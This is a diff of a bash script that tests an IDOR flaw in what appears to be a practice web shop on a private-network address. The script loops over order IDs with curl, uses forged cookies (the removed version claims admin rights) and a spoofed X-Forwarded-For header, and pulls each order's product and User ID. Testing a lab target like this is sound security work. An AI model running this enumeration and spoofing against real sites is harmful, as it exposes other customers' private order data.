@@ -1,27 +1,31 @@
 #!/bin/bash
-# IDOR (Insecure Direct Object Reference) Test Script
-# Target: VULN SHOP Order Page
+# IDOR 취약점 테스트 스크립트
+# 사용법: ./idor-test.sh [start_id] [end_id]
 
-TARGET="http://10.210.136.53:3000"
+TARGET="http://192.168.0.28:3000"
 MY_IP="10.0.0.101"
+START_ID="${1:-1}"
+END_ID="${2:-10}"
 
-echo "[*] IDOR Test - Order Information Disclosure"
-echo "[*] Target: $TARGET/order"
+echo "[*] IDOR 취약점 테스트 - 주문 정보 열거"
+echo "[*] 타겟: $TARGET/order"
+echo "[*] ID 범위: $START_ID ~ $END_ID"
+echo "[*] 공격자 쿠키: user=attacker, user_id=999"
 echo ""
 
-# Test accessing different order IDs
-for i in {1..10}; do
-    echo "[*] Testing Order ID: $i"
-    response=$(curl -s -H "X-Forwarded-For: $MY_IP" \
-        -H "Cookie: user=admin; isAdmin=true; user_id=1" \
-        "$TARGET/order?id=$i" 2>&1)
+for i in $(seq $START_ID $END_ID); do
+    RESULT=$(curl -s -H "X-Forwarded-For: $MY_IP" \
+        -H "Cookie: user=attacker; isAdmin=false; user_id=999" \
+        "$TARGET/order?id=$i")
 
-    if echo "$response" | grep -q "ORDER #"; then
-        echo "[+] FOUND: Order #$i exists"
-        echo "$response" | grep -oP 'User ID: \d+' || true
-        echo "$response" | grep -oP 'TOTAL.*?\$[\d.]+' || true
-        echo ""
+    if echo "$RESULT" | grep -q "ORDER #$i"; then
+        PRODUCT=$(echo "$RESULT" | grep -oP '(?<=<span>)[^<]+(?=</span>)' | head -1)
+        USER_ID=$(echo "$RESULT" | grep -oP 'User ID: \d+' | head -1)
+        echo "[+] 주문 #$i: $PRODUCT | $USER_ID"
     else
-        echo "[-] Order #$i not found or access denied"
+        echo "[-] 주문 #$i: 없음 또는 접근 불가"
     fi
 done
+
+echo ""
+echo "[*] 테스트 완료"
